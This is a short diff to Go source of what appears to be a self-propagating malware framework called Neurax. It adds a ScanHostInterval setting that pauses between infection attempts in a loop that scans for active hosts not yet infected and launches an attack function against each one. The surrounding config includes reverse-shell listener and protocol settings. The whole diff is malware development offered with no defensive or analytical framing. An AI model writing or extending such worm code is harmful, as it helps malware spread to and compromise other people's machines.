@@ -110,6 +110,7 @@ type __NeuraxConfig struct {
 	Verbose                  bool
 	Remove                   bool
 	ScanInterval             string
+	ScanHostInterval         string
 	ReverseListener          string
 	ReverseProto             string
 	PreventReexec            bool
@@ -158,6 +159,7 @@ var NeuraxConfig = __NeuraxConfig{
 	Verbose:                  false,
 	Remove:                   false,
 	ScanInterval:             "2m",
+	ScanHostInterval:         "none",
 	ReverseListener:          "none",
 	ReverseProto:             "udp",
 	PreventReexec:            true,
@@ -569,6 +571,9 @@ func neurax_scan_active(f func(string)) {
 		if IsHostActive(target) && !IsHostInfected(target) {
 			NeuraxDebug("Scanned " + target)
 			go f(target)
+			if NeuraxConfig.ScanHostInterval != "none" {
+				time.Sleep(time.Duration(IntervalToSeconds(NeuraxConfig.ScanHostInterval)) * time.Second)
+			}
 		}
 	}
 }
